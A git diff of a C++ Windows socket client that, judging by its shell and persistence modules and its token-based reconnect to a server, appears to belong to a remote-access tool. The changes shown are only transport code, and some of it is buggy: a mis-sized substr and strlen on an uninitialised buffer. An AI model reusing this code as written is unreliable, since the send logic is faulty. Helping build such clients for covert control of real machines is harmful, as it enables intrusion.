@@ -1,8 +1,8 @@
 #include "../inc/Connexion.h"
 #include "../inc/common.h"
-#include "../inc/HandShake.h" //for reconnect
 #include "../inc/ModShell.h"
 #include "../inc/Persistence.h"
+#include "../inc/other.h"
 
 #include <iostream>
 #include <winsock2.h>
@@ -47,6 +47,59 @@ int Connexion::openConnexion()
     return 0;
 }
 
+int Connexion::sendSafe(string data)
+{
+    int iResult=0;
+    bool is_modulo=false;
+    int len_data = data.length();
+    float nb_d_envoi =  float(len_data)  / float(BUFFER_LEN);
+    int i=0;
+
+    cout << nb_d_envoi << endl;
+    if(len_data > BUFFER_LEN)
+    {        
+        if((len_data%BUFFER_LEN)==0)
+        {
+            //is modulo 0 !
+            ////ex 1000 ≡ 0 (mod 10)
+            //you don't need to send a request again - see #!
+            is_modulo = true;
+            
+        }
+        for(i=0;i <= int(nb_d_envoi);i++)
+        {
+            if(i == 0)
+            {
+                //cout <<i <<": ----------> " << data.substr(0,BUFFER_LEN);
+                iResult=send(sock_client, data.substr(0,BUFFER_LEN).c_str(), BUFFER_LEN, 0);
+                checkSend(iResult);
+            }
+            else
+            {
+                iResult=send(sock_client, data.substr(BUFFER_LEN*i , BUFFER_LEN*(i+1)).c_str(),BUFFER_LEN, 0);
+                checkSend(iResult);
+            }
+            if(int(nb_d_envoi)==i && is_modulo == false) //#!
+            {
+                cout << "no modulo:" << endl;
+                cout << data.length() << endl;
+                iResult=send(sock_client, data.substr(BUFFER_LEN*i).c_str(), strlen(data.substr(BUFFER_LEN*i).c_str()), 0);
+                checkSend(iResult);
+            }
+        }
+    }
+    else
+    {
+        iResult = send(sock_client, data.c_str(), strlen(data.c_str()),0);
+        checkSend(iResult);
+    }
+    
+    cout << "NB request: " << i << endl;
+    iResult=send(sock_client,"\r\n",2,0); // send end communication.
+    checkSend(iResult);
+    return 0;
+    ////cout << "send ok " <<endl;
+}
 int Connexion::main(bool is_admin, string path_prog)
 {   
 
@@ -181,60 +234,6 @@ int Connexion::recvSafe(string &command,int i)
     }
     return 0;
 }
-
-int Connexion::sendSafe(string data)
-{
-    int iResult=0;
-    bool is_modulo=false;
-    int len_data = data.length();
-    float nb_d_envoi =  float(len_data)  / float(BUFFER_LEN);
-    int i=0;
-
-    cout << nb_d_envoi << endl;
-    if(len_data > BUFFER_LEN)
-    {        
-        if((len_data%BUFFER_LEN)==0)
-        {
-            //is modulo 0 !
-            ////ex 1000 ≡ 0 (mod 10)
-            //you don't need to send a request again - see #!
-            is_modulo = true;
-            
-        }
-        for(i=0;i <= int(nb_d_envoi);i++)
-        {
-            if(i == 0)
-            {
-                //cout <<i <<": ----------> " << data.substr(0,BUFFER_LEN);
-                iResult=send(sock_client, data.substr(0,BUFFER_LEN).c_str(), BUFFER_LEN, 0);
-                checkSend(iResult);
-            }
-            else
-            {
-                iResult=send(sock_client, data.substr(BUFFER_LEN*i , BUFFER_LEN*(i+1)).c_str(),BUFFER_LEN, 0);
-                checkSend(iResult);
-            }
-            if(int(nb_d_envoi)==i && is_modulo == false) //#!
-            {
-                cout << "no modulo:" << endl;
-                cout << data.length() << endl;
-                iResult=send(sock_client, data.substr(BUFFER_LEN*i).c_str(), strlen(data.substr(BUFFER_LEN*i).c_str()), 0);
-                checkSend(iResult);
-            }
-        }
-    }
-    else
-    {
-        iResult = send(sock_client, data.c_str(), strlen(data.c_str()),0);
-        checkSend(iResult);
-    }
-    
-    cout << "NB request: " << i << endl;
-    iResult=send(sock_client,"\r\n",2,0); // send end communication.
-    checkSend(iResult);
-    return 0;
-    ////cout << "send ok " <<endl;
-    }
 void Connexion::checkSend(int &iResult)
 {
     //Test if an error occurs when sending data 
@@ -271,15 +270,18 @@ void Connexion::reConnect()
     cout << "[+] Reconnect to server..." << endl;
     if(a_token.empty())
     {
+        //If the client does not have a token then a new connection with handshake.
         cout << "TOKKEN EMPTY" << endl;
     }
     else
     {
+        //if the client has a token then reconnects without handshaking
         openConnexion();
         cout << "[+] Send MOD_RECONNECT to server " << endl;
-        sendUltraSafe("MOD_RECONNECT");
+        sendUltraSafe(sock_client, "MOD_RECONNECT");
         cout << "[+] Send tokken to server " << endl;
-        sendUltraSafe(a_token); //send token
+        sendUltraSafe(sock_client, a_token); //send token
+        sendUltraSafe(sock_client, "\r\n");
     }
 
     /*
@@ -305,62 +307,4 @@ void Connexion::setToken(string token)
 {
     cout << "SET TOKKEN IN CONNEXION"  << endl;
     a_token = token;
-}
-
-
-
-void Connexion::sendUltraSafe(string data) //TO change 
-{
-    int len_send=0;
-    int len_recv=0;
-    char buffer[BUFFER_LEN];
-    string result;
-    if(strlen(buffer) > 0)
-    {
-        //clean buffer
-        cout << "Clean buffer in sendUltrasafe " << endl;
-        memset(buffer, 0, sizeof(buffer));
-    }
-    timeval timeout;
-    timeout.tv_sec = TIMEOUT_SOCK;
-    timeout.tv_usec = 0;
-
-    len_send = send(sock_client, data.c_str(), strlen(data.c_str()), 0);
-    if(len_send == SOCKET_ERROR)
-    {
-        //error
-        cout << "error " << endl;
-    }
-    else
-    {   
-        struct fd_set fds;
-
-        FD_ZERO(&fds);
-        FD_SET(sock_client, &fds);
-    
-        int selectSock = select(0, &fds, 0, 0, &timeout);
-        if(selectSock > 0)
-        {
-            len_recv = recv(sock_client, buffer, sizeof(buffer), 0);
-            result.append(buffer, len_recv);
-
-            if(result == "confirmation")
-            {
-                ;
-                //cout << "confirmation ok ! in sendUltraSafe" << endl;
-            }
-            
-            else
-            {
-                cout << "ERROR in sendUltraSafe confirmation: "  << endl;
-            }
-
-        }
-        else if (selectSock == 0)
-        {
-            //timeout
-            ;        
-        }
-    }
-    
 }
